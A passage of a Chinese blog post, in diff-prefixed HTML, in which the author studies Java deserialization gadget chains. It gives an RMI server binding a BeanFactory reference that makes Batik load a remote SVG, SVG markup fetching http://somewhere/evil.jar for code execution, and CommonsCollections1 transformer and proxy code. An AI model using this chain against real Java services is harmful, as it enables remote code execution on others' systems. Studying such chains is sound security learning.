+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">POJONode</span><span class="w"> </span><span class="n">pojoNode</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">POJONode</span><span class="p">(</span><span class="n">oracleCachedRowSet</span><span class="p">);</span><span class="w"> 
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>似曾相识。或许大多数都是这样层层嵌套的吧。</p>
+<hr>
+<blockquote>
+<p>just a note</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">setFieldValue</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">String</span><span class="w"> </span><span class="n">field</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="n">val</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Field</span><span class="w"> </span><span class="n">dField</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">obj</span><span class="p">.</span><span class="na">getClass</span><span class="p">().</span><span class="na">getDeclaredField</span><span class="p">(</span><span class="n">field</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">dField</span><span class="p">.</span><span class="na">setAccessible</span><span class="p">(</span><span class="kc">true</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">dField</span><span class="p">.</span><span class="na">set</span><span class="p">(</span><span class="n">obj</span><span class="p">,</span><span class="w"> </span><span class="n">val</span><span class="p">);</span><span class="w"> </span><span class="err">#</span><span class="w"> </span><span class="n">将obj对象的dField值修改为val</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><hr>
+<hr>
+<p>所以上述的poc部分（参考里面有完整版本）只是完成了让精心构造的对象在被反序列化的时候加载RMI触发RCE</p>
+<p>那么放在RMI上与之绑定的RCE代码应该是什么？</p>
+<hr>
+<hr>
+<h3 id="rce">RCE
+</h3><p><a class="link" href="https://www.agarri.fr/blog/archives/2012/05/11/svg_files_and_java_code_execution/index.html"  target="_blank" rel="noopener"
+    >svg files and java code execution</a></p>
+<p>一篇2012的文章……</p>
+<ul>
+<li>使用batlk framework实现SVG转换PNG</li>
+<li>SVG 1.1 和SVG Tiny 1.2 可以通过一些specifications去调用java代码，并且batlk支持</li>
+</ul>
+<p>大概阅读完，</p>
+<ul>
+<li>编写包含类似<code>Runtime.getRuntime().exec()</code>方法的paylaod类</li>
+<li>在打包之前（if could）修改<code>MANIFEST.MF</code>中的一些内容，给予一些特殊的权限</li>
+<li>打包成jar</li>
+<li>在SVG file中编写<code>&lt;script type=&quot;application/java-archive&quot; xlink:href=&quot;http://somewhere/evil.jar&quot;/&gt;</code>导入jar</li>
+</ul>
+<hr>
+<p>接着上面的内容，把存有导入恶意jar路径的svg文件与RMI绑定（参考中的）：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">RMIServer</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">RemoteException</span><span class="p">,</span><span class="w"> </span><span class="n">NamingException</span><span class="p">,</span><span class="w"> </span><span class="n">AlreadyBoundException</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Registry</span><span class="w"> </span><span class="n">registry</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LocateRegistry</span><span class="p">.</span><span class="na">createRegistry</span><span class="p">(</span><span class="w"> </span><span class="n">1099</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ResourceRef</span><span class="w"> </span><span class="n">ref</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ResourceRef</span><span class="p">(</span><span class="s">&#34;org.apache.batik.swing.JSVGCanvas&#34;</span><span class="p">,</span><span class="w"> </span><span class="kc">null</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;&#34;</span><span class="p">,</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">                </span><span class="kc">true</span><span class="p">,</span><span class="s">&#34;org.apache.naming.factory.BeanFactory&#34;</span><span class="p">,</span><span class="kc">null</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;forceString&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;URI=test&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ref</span><span class="p">.</span><span class="na">add</span><span class="p">(</span><span class="k">new</span><span class="w"> </span><span class="n">StringRefAddr</span><span class="p">(</span><span class="s">&#34;URI&#34;</span><span class="p">,</span><span class="w"> </span><span class="s">&#34;http://127.0.0.1:7001/calc.svg&#34;</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">ReferenceWrapper</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">ReferenceWrapper</span><span class="p">(</span><span class="n">ref</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">registry</span><span class="p">.</span><span class="na">bind</span><span class="p">(</span><span class="s">&#34;Object&#34;</span><span class="p">,</span><span class="w"> </span><span class="n">referenceWrapper</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>那么，无论是作为RCE入口的RMI，还是作为触发RMI的调用链都完成。</p>
+<hr>
+<hr>
+<p>到这里，唯一还不理解的就是，oracleCachedRowSet。
+可能代码太多，有空我再看看。</p>
+<p>这里面还有很多其他的参考链接都还需要看。</p>
+<hr>
+<h2 id="compare">compare
+</h2><blockquote>
+<p>对比一下其他的，比如CommonsCollections1</p>
+</blockquote>
+<hr>
+<h3 id="cc1-overview">CC1 Overview
+</h3><p>CC1使用的是Transformer链中链+HashMap</p>
+<blockquote>
+<p>transformer</p>
+</blockquote>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="nd">@Contract</span><span class="p">(</span><span class="n">pure</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="kc">true</span><span class="p">)</span><span class="w">   
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="nf">InvokerTransformer</span><span class="p">(</span><span class="w">     
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="n">String</span><span class="w"> </span><span class="n">methodName</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="n">paramTypes</span><span class="p">,</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="w"> </span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>一个例子：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="k">new</span><span class="w"> </span><span class="n">InvokerTransformer</span><span class="p">(</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">	</span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="n">String</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">Class</span><span class="o">[]</span><span class="p">.</span><span class="na">class</span><span class="w"> </span><span class="p">},</span><span class="w"> 
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">new</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="p">{</span><span class="w">  </span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Class</span><span class="o">[</span><span class="n">0</span><span class="o">]</span><span class="w"> </span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">)</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>通过这个链条将<code>getMethod</code>，<code>getRuntime</code>，<code>invoke</code>，<code>exec</code>四个方法写入Transformer[]中</p>
+<p>接下类又用自定义过的LazyMap来将 <code>HashMap</code>和<code>Transformer[]</code>绑定到一起：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">lazyMap</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">.</span><span class="na">decorate</span><span class="p">(</span><span class="n">innerMap</span><span class="p">,</span><span class="w"> </span><span class="n">transformerChain</span><span class="p">);</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="c1">// decorate方法</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="nf">decorate</span><span class="p">(</span><span class="n">Map</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">Transformer</span><span class="w"> </span><span class="n">factory</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">LazyMap</span><span class="p">(</span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="n">factory</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>再接下来，引入CC1的序列化和反序列化中的重要的类<code>public static final String ANN_INV_HANDLER_CLASS = &quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;;</code></p>
+<p>源代码是</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="w"> </span><span class="n">mapProxy</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createMemoitizedProxy</span><span class="p">(</span><span class="n">lazyMap</span><span class="p">,</span><span class="w"> </span><span class="n">Map</span><span class="p">.</span><span class="na">class</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">final</span><span class="w"> </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">Gadgets</span><span class="p">.</span><span class="na">createMemoizedInvocationHandler</span><span class="p">(</span><span class="n">mapProxy</span><span class="p">);</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>几个函数的补充代码：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">createMemoitizedProxy</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">iface</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="p">...</span><span class="w"> </span><span class="n">ifaces</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">createProxy</span><span class="p">(</span><span class="n">createMemoizedInvocationHandler</span><span class="p">(</span><span class="n">map</span><span class="p">),</span><span class="w"> </span><span class="n">iface</span><span class="p">,</span><span class="w"> </span><span class="n">ifaces</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="nf">createMemoizedInvocationHandler</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Map</span><span class="o">&lt;</span><span class="n">String</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">&gt;</span><span class="w"> </span><span class="n">map</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Exception</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="p">(</span><span class="n">InvocationHandler</span><span class="p">)</span><span class="w"> </span><span class="n">Reflections</span><span class="p">.</span><span class="na">getFirstCtor</span><span class="p">(</span><span class="n">ANN_INV_HANDLER_CLASS</span><span class="p">).</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Override</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">map</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">T</span><span class="w"> </span><span class="nf">createProxy</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="n">ih</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;</span><span class="n">T</span><span class="o">&gt;</span><span class="w"> </span><span class="n">iface</span><span class="p">,</span><span class="w"> </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;</span><span class="p">...</span><span class="w"> </span><span class="n">ifaces</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">final</span><span class="w"> </span><span class="n">Class</span><span class="o">&lt;?&gt;[]</span><span class="w"> </span><span class="n">allIfaces</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Class</span><span class="o">&lt;?&gt;[]</span><span class="p">)</span><span class="w"> </span><span class="n">Array</span><span class="p">.</span><span class="na">newInstance</span><span class="p">(</span><span class="n">Class</span><span class="p">.</span><span class="na">class</span><span class="p">,</span><span class="w"> </span><span class="n">ifaces</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="n">1</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="n">allIfaces</span><span class="o">[</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">iface</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="w"> </span><span class="n">ifaces</span><span class="p">.</span><span class="na">length</span><span class="w"> </span><span class="o">&gt;</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">arraycopy</span><span class="p">(</span><span class="n">ifaces</span><span class="p">,</span><span class="w"> </span><span class="n">0</span><span class="p">,</span><span class="w"> </span><span class="n">allIfaces</span><span class="p">,</span><span class="w"> </span><span class="n">1</span><span class="p">,</span><span class="w"> </span><span class="n">ifaces</span><span class="p">.</span><span class="na">length</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">iface</span><span class="p">.</span><span class="na">cast</span><span class="p">(</span><span class="n">Proxy</span><span class="p">.</span><span class="na">newProxyInstance</span><span class="p">(</span><span class="n">Gadgets</span><span class="p">.</span><span class="na">class</span><span class="p">.</span><span class="na">getClassLoader</span><span class="p">(),</span><span class="w"> </span><span class="n">allIfaces</span><span class="p">,</span><span class="w"> </span><span class="n">ih</span><span class="p">));</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>过于抽象，通过举例说明：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="c1">//demo</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">Say</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">Perosn</span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">name</span><span class="p">(){</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;SAY&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.InvocationHandler</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Method</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">SayInvocationHandler</span><span class="w"> </span><span class="kd">implements</span><span class="w"> </span><span class="n">InvocationHandler</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">private</span><span class="w"> </span><span class="n">Perosn</span><span class="w"> </span><span class="n">person</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="nf">SayInvocationHandler</span><span class="p">(</span><span class="n">Perosn</span><span class="w"> </span><span class="n">perosn</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">this</span><span class="p">.</span><span class="na">person</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">perosn</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="nd">@Override</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="n">Object</span><span class="w"> </span><span class="nf">invoke</span><span class="p">(</span><span class="n">Object</span><span class="w"> </span><span class="n">proxy</span><span class="p">,</span><span class="w"> </span><span class="n">Method</span><span class="w"> </span><span class="n">method</span><span class="p">,</span><span class="w"> </span><span class="n">Object</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="kd">throws</span><span class="w"> </span><span class="n">Throwable</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;SayInvocationHandler&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Object</span><span class="w"> </span><span class="n">invoke</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">method</span><span class="p">.</span><span class="na">invoke</span><span class="p">(</span><span class="n">person</span><span class="p">,</span><span class="w"> </span><span class="n">args</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">System</span><span class="p">.</span><span class="na">out</span><span class="p">.</span><span class="na">println</span><span class="p">(</span><span class="s">&#34;SayInvocationHandler DONE&#34;</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="n">invoke</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="p">}</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="p">}</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kn">import</span><span class="w"> </span><span class="nn">java.lang.reflect.Proxy</span><span class="p">;</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="kd">public</span><span class="w"> </span><span class="kd">class</span> <span class="nc">TEst</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">    </span><span class="kd">public</span><span class="w"> </span><span class="kd">static</span><span class="w"> </span><span class="kt">void</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="n">String</span><span class="o">[]</span><span class="w"> </span><span class="n">args</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">Say</span><span class="w"> </span><span class="n">s</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">Say</span><span class="p">();</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">        </span><span class="n">SayInvocationHandler</span><span class="w"> </span><span class="n">handler</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="k">new</span><span class="w"> </span><span class="n">SayInvocationHandler</span><span class="p">(</span><span class="n">s</span><span class="p">);</span><span class="w">  
+</span></span></span><span class="line"><span class="cl"><span class="w">  
